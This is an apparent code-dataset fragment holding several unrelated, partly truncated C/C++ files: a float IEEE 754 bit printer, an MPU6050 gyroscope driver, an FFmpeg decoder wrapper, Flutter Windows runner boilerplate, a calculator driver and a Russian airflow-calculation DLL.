    "//Victor Lopez (vml45)\n//Ali Khawaja (xyr5)\n#include <iostream>\n#include <iomanip>\n#include <bitset>\n#include <sstream>\n#include <limits>\n\nusing namespace std;\n\n// Function to convert a float value to IEEE 754 bit representation\nbitset<32> cvtToIEEE(float f) {\n    auto *bits_ptr = reinterpret_cast<unsigned int *>(&f);\n    bitset<32> bs(*bits_ptr);\n    return bs;\n}\n\nint main(int argc, char *argv[]) {\n    // Check if the number of arguments is correct\n    if (argc != 3) {\n        cout << \"usage: \" << argv[0] << \" loop_bound loop_counter\" << endl;\n        return 1; // indicate error\n    }\n\n    // Parse command-line arguments\n    float loopBound, loopCounter;\n    stringstream(argv[1]) >> loopBound;\n    stringstream(argv[2]) >> loopCounter;\n\n    // Display loop bound and loop counter IEEE representations\n    cout << \"Loop bound: 0 \";\n    cout << cvtToIEEE(loopBound).to_string().substr(1, 8) << \" \";\n    cout << cvtToIEEE(loopBound).to_string().substr(9) << endl;\n\n    cout << \"Loop counter: 0 \";\n    cout << cvtToIEEE(loopCounter).to_string().substr(1, 8) << \" \";\n    cout << cvtToIEEE(loopCounter).to_string().substr(9) << endl;\n\n    // Extract exponents\n    int boundExponent = (cvtToIEEE(loopBound) >> 23).to_ulong();\n    int counterExponent = (cvtToIEEE(loopCounter) >> 23).to_ulong();\n\n    // Check for potential overflow\n    int expDiff = abs(boundExponent - counterExponent);\n    if (expDiff >= 23) { // Exponent difference more than or equal to 23 indicates overflow\n        cout << \"Warning: Possible overflow!\" << endl;\n        cout << \"Overflow threshold:\" << endl;\n        float overflow_threshold = numeric_limits<float>::max() / 2;\n        cout << scientific << setprecision(6) << overflow_threshold << endl;\n        cout << \"0 \";\n        cout << cvtToIEEE(overflow_threshold).to_string().substr(1, 8) << \" \";\n        cout << cvtToIEEE(overflow_threshold).to_string().substr(9) << endl;\n    } else {\n        cout << \"There is no overflow!\" << endl;\n    }\n\n    return 0;\n}\n",
    "/*\n * @Author: ELEGOO\n * @Date: 2019-10-22 11:59:09\n * @LastEditTime: 2020-06-30 10:34:30\n * @LastEditors: Changhua\n * @Description: MPU6050 Data solution\n * @FilePath: \n */\n\n#include \"I2Cdev.h\"\n#include \"MPU6050.h\"\n#include \"Wire.h\"\n#include \"MPU6050_getdata.h\"\n#include <stdio.h>\n#include <math.h>\n\nMPU6050 accelgyro;\nMPU6050_getdata MPU6050Getdata;\n\n// static void MsTimer2_MPU6050getdata(void)\n// {\n//   sei();\n//   int16_t ax, ay, az, gx, gy, gz;\n//   accelgyro.getMotion6(&ax, &ay, &az, &gx, &gy, &gz); //Read the raw values of the six axes\n//   float gyroz = -(gz - MPU6050Getdata.gzo) / 131 * 0.005f;\n//   MPU6050Getdata.yaw += gyroz;\n// }\n\nbool MPU6050_getdata::MPU6050_dveInit(void)\n{\n  Wire.begin();\n  uint8_t chip_id = 0x00;\n  uint8_t cout;\n  do\n  {\n    chip_id = accelgyro.getDeviceID();\n    Serial.print(\"MPU6050_chip_id: \");\n    Serial.println(chip_id);\n    delay(10);\n    cout += 1;\n    if (cout > 10)\n    {\n      return true;\n    }\n  } while (chip_id == 0X00 || chip_id == 0XFF); //Ensure that the slave device is online\uff08Wait forcibly to get the ID\uff09\n  accelgyro.initialize();\n  // unsigned short times = 100; //Sampling times\n  // for (int i = 0; i < times; i++)\n  // {\n  //   gz = accelgyro.getRotationZ();\n  //   gzo += gz;\n  // }\n  // gzo /= times; //Calculate gyroscope offset\n  return false;\n}\nbool MPU6050_getdata::MPU6050_calibration(void)\n{\n  unsigned short times = 100; //Sampling times\n  for (int i = 0; i < times; i++)\n  {\n    gz = accelgyro.getRotationZ();\n    gzo += gz;\n  }\n  gzo /= times; //Calculate gyroscope offset\n\n  // gzo = accelgyro.getRotationZ();\n  return false;\n}\nbool MPU6050_getdata::MPU6050_dveGetEulerAngles(float *Yaw)\n{\n  unsigned long now = millis();           //Record the current time(ms)\n  dt = (now - lastTime) / 1000.0;         //Caculate the derivative time(s)\n  lastTime = now;                         //Record the last sampling time(ms)\n  gz = accelgyro.getRotationZ();          //Read the raw values of the six axes\n  float gyroz = -(gz - gzo) / 131.0 * dt; //z-axis angular velocity\n  if (fabs(gyroz) < 0.05)                 //Clear instant zero drift signal\n  {\n    gyroz = 0.00;\n  }\n  agz += gyroz; //z-axis angular velocity integral\n  *Yaw = agz;\n  return false;\n}\n",
    "#include \"avcodec.hpp\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n#include <libavcodec/avcodec.h>\n#include <libavformat/avformat.h>\n#include <libswscale/swscale.h>\n#include <libavutil/display.h>\n#include <libavutil/imgutils.h>\n\n#ifdef __cplusplus\n}\n#endif\n\nextern AVInputFormat ff_mov_demuxer;\nextern AVInputFormat ff_matroska_demuxer;\nextern AVInputFormat ff_mp3_demuxer;\nextern AVInputFormat ff_flac_demuxer;\nextern AVInputFormat ff_wav_demuxer;\nextern AVInputFormat ff_aac_demuxer;\nextern AVInputFormat ff_ogg_demuxer;\nextern AVCodec ff_h264_decoder;\nextern AVCodec ff_mpeg4_decoder;\nextern AVCodec ff_vp9_decoder;\nextern AVCodec ff_vp8_decoder;\nextern AVCodec ff_mp3_decoder;\nextern AVCodec ff_flac_decoder;\nextern AVCodec ff_aac_decoder;\nextern AVCodec ff_vorbis_decoder;\n\nvoid avcodec_init()\n{\n    av_log_set_level(AV_LOG_ERROR);\n}\n\nstruct avcodec_decoder_struct {\n    const cv::Mat* mat;\n    ptrdiff_t read_index;\n    AVFormatContext* container;\n    AVCodecContext* codec;\n    AVIOContext* avio;\n    int video_stream_index;\n};\n\nstatic int avcodec_decoder_read_callback(void* d_void, uint8_t* buf, int buf_size)\n{\n    avcodec_decoder d = static_cast<avcodec_decoder>(d_void);\n    size_t buf_len = d->mat->total() - d->read_index;\n    size_t read_len = (buf_len > buf_size) ? buf_size : buf_len;\n    if (read_len == 0) {\n        return AVERROR_EOF;\n    }\n    memmove(buf, d->mat->data + d->read_index, read_len);\n    d->read_index += read_len;\n    return read_len;\n}\n\nstatic int64_t avcodec_decoder_seek_callback(void* d_void, int64_t offset, int whence)\n{\n    avcodec_decoder d = static_cast<avcodec_decoder>(d_void);\n    uint8_t* to;\n    switch (whence) {\n    case SEEK_SET:\n        to = d->mat->data + offset;\n        break;\n    case SEEK_CUR:\n        to = d->mat->data + d->read_index + offset;\n        break;\n    case SEEK_END:\n        to = d->mat->data + d->mat->total() + offset;\n        break;\n    case AVSEEK_SIZE:\n        return d->mat->total();\n    default:\n        return -1;\n    }\n    if (to < d->mat->data) {\n        return -1;\n    }\n    if (to >= (d->mat->data + d->mat->total())) {\n        return -1;\n    }\n    d->read_index = (to - d->mat->data);\n    return 0;\n}\n\nstatic bool avcodec_decoder_is_audio(const avcodec_decoder d)\n{\n    if (!d->container) {\n        return false;\n    }\n    if (d->container->iformat == &ff_mp3_demuxer) {\n        return true;\n    }\n    if (d->container->iformat == &ff_flac_demuxer) {\n        return true;\n    }\n    if (d->container->iformat == &ff_wav_demuxer) {\n        return true;\n    }\n    if (d->container->iformat == &ff_aac_demuxer) {\n        return true;\n    }\n    if (d->container->iformat == &ff_ogg_demuxer) {\n        return true;\n    }\n    return false;\n}\n\nbool avcodec_decoder_is_streamable(const opencv_mat mat) {\n    const int64_t probeBytesLimit = 32 * 1024; // Define the probe limit\n    const size_t atomHeaderSize = 8;\n    int64_t bytesRead = 0;\n    const cv::Mat* buf = static_cast<const cv::Mat*>(mat);\n    size_t bufSize = buf->total();\n    size_t peekSize = MIN(bufSize, probeBytesLimit);\n\n    while(bytesRead + atomHeaderSize <= peekSize) {\n        // Read atom size and type\n        uint32_t atomSize = (buf->data[bytesRead] << 24) | (buf->data[bytesRead + 1] << 16) |\n                            (buf->data[bytesRead + 2] << 8) | buf->data[bytesRead + 3];\n\n        // Validate atom size\n        if (atomSize < atomHeaderSize || atomSize + bytesRead > bufSize) {\n            break;\n        }\n\n        // Read atom type\n        char atomType[4];\n        memcpy(atomType, &buf->data[bytesRead + 4], 4);\n\n        // Check for 'moov' and 'mdat' atoms using byte comparison\n        if (memcmp(atomType, \"moov\", 4) == 0) {\n            return true;\n        }\n        if (memcmp(atomType, \"mdat\", 4) == 0) {\n            return false;\n        }\n\n        // Move to the next atom position\n        bytesRead += atomSize; // Atom size includes the header size\n    }\n\n    return false;\n}\n\navcodec_decoder avcodec_decoder_create(const opencv_mat buf)\n{\n    avcodec_decoder d = new struct avcodec_decoder_struct();\n    memset(d, 0, sizeof(struct avcodec_decoder_struct));\n    d->mat = static_cast<const cv::Mat*>(buf);\n\n    d->container = avformat_alloc_context();\n    if (!d->container) {\n        avcodec_decoder_release(d);\n        return NULL;\n    }\n\n    d->avio = avio_alloc_context(\n      NULL, 0, 0, d, avcodec_decoder_read_callback, NULL, avcodec_decoder_seek_callback);\n    if (!d->avio) {\n        avcodec_decoder_release(d);\n        return NULL;\n    }\n    d->container->pb = d->avio;\n\n    int res = avformat_open_input(&d->container, NULL, NULL, NULL);\n    if (res < 0) {\n        avformat_free_context(d->container);\n        d->container = NULL;\n        avcodec_decoder_release(d);\n        return NULL;\n    }\n\n    // perform a quick search for the video stream index in the container\n    AVCodecParameters* codec_params = NULL;\n    for (int i = 0; i < d->container->nb_streams; i++) {\n        if (d->container->streams[i]->codecpar-",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"Calculator.h\"\n#include \"Calculator1.h\"\n#include <iostream>\n\nusing namespace std;\n\nint main() {\n\tCalculator calculator;\n\tcin >> calculator;\n\tcout << calculator;\n\n\tCalculator calculator1;\n\tcin >> calculator1;\n\tcout << calculator1;\n\n\n\tCalculator fraction2 = calculator + calculator1;\n\n\tcout << fraction2;\n\n\tfraction2 = calculator - calculator1;\n\tcout << fraction2;\n\n\tfraction2 = calculator * calculator1;\n\tcout << fraction2;\n\n\n\tcout << \"> \";\n\tif (calculator > calculator1) { cout << \"yes\" << endl; }\n\telse cout << \"no\" << endl;\n\tcout << \"< \";\n\tif (calculator < calculator1) { cout << \"yes\" << endl; }\n\telse cout << \"no\" << endl;\n\tcout << \"== \";\n\tif (calculator == calculator1) { cout << \"yes\" << endl; }\n\telse cout << \"no\" << endl;\n\tcout << \">= \";\n\tif (calculator != calculator1) { cout << \"yes\" << endl; }\n\telse cout << \"no\" << endl;\n\tcout << \"<= \";\n\tif (calculator >= calculator1) { cout << \"yes\" << endl; }\n\telse cout << \"no\" << endl;\n\tcout << \"!= \";\n\tif (calculator <= calculator1) { cout << \"yes\" << endl; }\n\telse cout << \"no\" << endl;\n\n\n\n\tCalculator1 calculator3;\n\tcin >> calculator3;\n\tcout << calculator3;\n\n\tCalculator1 calculator4;\n\tcin >> calculator4;\n\tcout << calculator4;\n\n\n\tCalculator1 calculator5 = calculator3 + calculator4;\n\n\tcout << calculator5;\n\n\tcalculator5 = calculator3 - calculator4;\n\tcout << calculator5;\n\n\tcalculator5 = calculator3 * calculator4;\n\tcout << calculator5;\n\n\n\tcout << \"> \";\n\tif (calculator3 > calculator4) { cout << \"yes\" << endl; }\n\telse cout << \"no\" << endl;\n\tcout << \"< \";\n\tif (calculator3 < calculator4) { cout << \"yes\" << endl; }\n\telse cout << \"no\" << endl;\n\tcout << \"== \";\n\tif (calculator3 == calculator4) { cout << \"yes\" << endl; }\n\telse cout << \"no\" << endl;\n\tcout << \">= \";\n\tif (calculator3 != calculator4) { cout << \"yes\" << endl; }\n\telse cout << \"no\" << endl;\n\tcout << \"<= \";\n\tif (calculator3 >= calculator4) { cout << \"yes\" << endl; }\n\telse cout << \"no\" << endl;\n\tcout << \"!= \";\n\tif (calculator3 <= calculator4) { cout << \"yes\" << endl; }\n\telse cout << \"no\" << endl;\n\n\treturn 0;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_application_2\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff// dllmain.cpp : \u041e\u043f\u0440\u0435\u0434\u0435\u043b\u044f\u0435\u0442 \u0442\u043e\u0447\u043a\u0443 \u0432\u0445\u043e\u0434\u0430 \u0434\u043b\u044f \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u044f DLL.\n#include \"pch.h\"\n#include \"dllmain.h\"\n\n\n\nBOOL APIENTRY DllMain( HMODULE hModule,\n                       DWORD  ul_reason_for_call,\n                       LPVOID lpReserved\n                     )\n{\n    switch (ul_reason_for_call)\n    {\n    case DLL_PROCESS_ATTACH:\n        break;\n    case DLL_THREAD_ATTACH:\n        break;\n    case DLL_THREAD_DETACH:\n        break;\n    case DLL_PROCESS_DETACH:\n        break;\n    }\n    return TRUE;\n}\n\n\n\ndouble get_C(double Re, double B, double D) {\n    double A = pow((19000. * B / Re), 0.8);\n    double L1 = 0, L2 = 0; // \u0434\u043b\u044f \u0443\u0433\u043b\u043e\u0432\u043e\u0433\u043e \u0441\u043f\u043e\u0441\u043e\u0431\u0430 \u043e\u0442\u0431\u043e\u0440\u0430 \u0434\u0430\u0432\u043b\u0435\u043d\u0438\u0439\n    double M1 = 2 * L2 / (1 - B);\n    double M2 = 0;\n    if (D < 0.07112) {\n        M2 = 0.011 * (0.75 - B) * (2.8 - (D / 0.0254));\n    }\n    return 0.5961 + 0.0261 * pow(B, 2) - 0.216 * pow(B, 8) + 0.000521 * pow(((B * 1e6) / Re), 0.7) + (\n        0.0188 + 0.0063 * A) * pow(B, 3.5) * pow((1e6 / Re), 0.3) + (\n            0.043 + 0.08 * pow(e, (-10 * L1)) - 0.123 * pow(e, (-7 * L1))) * (1 - 0.11 * A) * (\n                pow(B, 4) / (1 - pow(B, 4))) - 0.031 * (M1 - 0.8 * pow(M1, 1.1)) * pow(B, 1.3) + M2;\n}\n\ndouble get_A(int i, double Re) {\n    double tab[3][3][4] = {\n        { // index 1\n            {8.87, -3.7114, 0.41841, 0},\n            {6.7307, -5.5844, 0.732485, 0},\n            {-10.244, 5.7094, 0.76477, 0}\n        },\n        { // index 2\n            {27.23, -11.458, 1.6117, -0.07567},\n            {-25.928, 12.426, -2.09397, 0.106143},\n            {1.7622, -3.8765, 1.05567, -0.076764}\n        },\n        { // index 3\n            {16.5416, -6.60709, 0.88147, -0.039226},\n            {322.594, -132.2, 17.795, -0.799765},\n            {-92.029, 37.935, -5.1885, 0.23583}\n        }\n    };\n\n    double sum = 0;\n    int tab_index = (Re <= 1e5) ? 0 : (Re <= 3e6) ? 1 : 2;\n\n    for (int k = 0; k < 4; ++k) {\n        sum += tab[tab_index][i][k] * pow(fabs(log10(Re)), k);\n    }\n\n    return sum;\n}\n\ndouble get_y(double Re, double Ra, double Ra_max, double Ra_min, double D, bool  mark) {\n    double Rsh = 0.0, kD = 0.0, kR = 5.035 / Re;\n\n    if (!mark) {\n        Rsh = pi * Ra;\n    }\n    else if (Ra > Ra_max) {\n        Rsh = pi * Ra_max;\n    }\n    else {\n        Rsh = pi * Ra_min;\n    }\n\n    kD = 0.26954 * Rsh / D;\n\n    return pow((1.74 - 2 * log10((2 * Rsh / D) - ((37.36 * log10(kD - kR * log10(kD + 3.3333 * kR))) / Re))), -2);\n}\n\ndouble get_Ksh(double Re, double Ra, double B, double D) {\n    double leftRa_max = 0, leftRa_min = 0, Ra_max = 0, Ra_min = 0;\n    // Ra_max   \n    if (Re <= 1e4) {\n        leftRa_max = 0.718866 * pow(B, (-3.887)) + 0.364;\n    }\n    else if (B < 0.65) {\n        leftRa_max = get_A(0, Re) * pow(B, get_A(1, Re)) + get_A(2, Re);\n    }\n    else {\n        leftRa_max = get_A(0, Re) * pow(0.65, get_A(1, Re)) + get_A(2, Re);\n    }\n\n    if (leftRa_max >= 15) {\n        Ra_max = 15e-4 * D;\n    }\n    else {\n        Ra_max = leftRa_max * 1e-4 * D;\n    }\n\n    // Ra_min\n    if (B < 0.65) {\n        leftRa_min = 7.1592 - 12.387 * B - (20.118 - 3.469 * B) * log10(Re) + (0.1382 - 0.23762 * B) * pow(log10(Re), 2);\n    }\n    else {\n        leftRa_min = -0.892352 + 0.24308 * log10(Re) - 0.0162562 * pow(log10(Re), 2);\n    }\n\n    if (leftRa_min <= 0 or Re < 3e6) {\n        Ra_min = 0;\n    }\n    else {\n        Ra_min = 1e-4 * D * leftRa_min;\n    }\n\n    if (Ra >= Ra_min and Ra <= Ra_max) {\n        return 1;\n    }\n    else {\n        double y0 = get_y(Re, Ra, Ra_max, Ra_min, D), y1 = get_y(Re, Ra, Ra_max, Ra_min, D, true);\n\n        return 1 + 5.22 * pow(B, 3.5) * (y0 - y1);\n    }\n\n\n}\n\ndouble get_qm(double Re_cur, double d, double Ksu, double E, double B, double D, double Ra, double Kp, double eps, double dP, double T, double P) {\n    double C = get_C(Re_cur, B, D); // (\u0413\u041e\u0421\u0422 8.586.2 \u043f.5.3.2.1)\n    double Ksh = get_Ksh(Re_cur, Ra, B, D); // (\u0413\u041e\u0421\u0422 8.586.2 \u043f.5.3.2.2)\n    return 0.25 * pi * pow(d, 2) * C * E * Ksh * Kp * eps * pow((2 * dP * Pls * ((P * Ts) / (Ps * T))), 0.5);\n}\n\ndouble get_true_qm(double u, double d_20, double Ksu, double E, double B, double D, double Ra, double Kp, double eps, double dP, double T, double P) {\n    double Re_first = 1e6;\n    double qm_first = get_qm(Re_first, d_20, Ksu, E, B, D, Ra, Kp, eps, dP, T, P); // (\u0413\u041e\u0421\u0422 8.568.5 \u043f.5.2.3)\n    double Re_cur = get_Re(qm_first, D, u); // (\u0413\u041e\u0421\u0422 8.568.5 \u043f.5.2.5)\n    double qm_cur = get_qm(Re_cur = Re_cur, d_20, Ksu, E, B, D, Ra, Kp, eps, dP, T, P);\n    while (100 * fabs(qm_cur - qm_first) / qm_first >= 0.001) {\n        qm_first = qm_cur;\n        Re_cur = get_Re(qm_first, D, u);\n        qm_cur = get_qm(Re_cur = Re_cur, d_20, Ksu, E, B, D, Ra, Kp, eps, dP, T, P);\n    }\n\n    return round(3600 * qm_cur); // \u043f\u0435\u0440\u0435\u0432\u043e\u0434 \u0432 \u043a\u0433/\u0447 \n}\n\ndouble get_Re(double qm, double D, double u) {\n    return (4 * qm) / (pi * D * u);\n};\n\n__declspec(dllexport) double __cdecl calc_airflow_mu(double p_izm, double dp_izm, double t_izm, double d_20, double D_20) {\n    // \u0418\u0441\u0445\u043e\u0434\u043d\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435\n\n    double Ra = 0.045e-3; // \u0421\u0440\u0435\u0434\u043d\u0435\u0435 \u0430\u0440\u0438\u0444\u043c\u0435\u0442\u0438\u0447\u0435\u0441\u043a\u043e\u0435 \u043e\u0442\u043a\u043b\u043e\u043d\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0444\u0438\u043b\u044f \u0448\u0435",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
